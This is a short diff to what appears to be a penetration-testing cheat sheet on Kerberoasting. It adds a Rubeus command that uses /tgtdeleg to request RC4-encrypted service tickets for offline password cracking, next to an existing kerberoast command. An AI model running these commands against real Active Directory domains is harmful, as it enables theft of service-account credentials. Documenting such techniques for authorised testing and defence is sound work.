@@ -44,3 +44,9 @@ A ticket is prefixed with `$krb5tgs$23$*`, where `23` is `RC4` (type 23):
 ```PowerShell
 .\Rubeus.exe kerberoast /user:[user] /nowrap
 ```
+
+### Request a RC4 encrypted ticket
+> This only works for Windows Server 2016 and earlier, unless the group policy is modified to allow RC4
+```PowerShell
+.\Rubeus.exe kerberoast /tgtdeleg /user:[user] /nowrap
+```
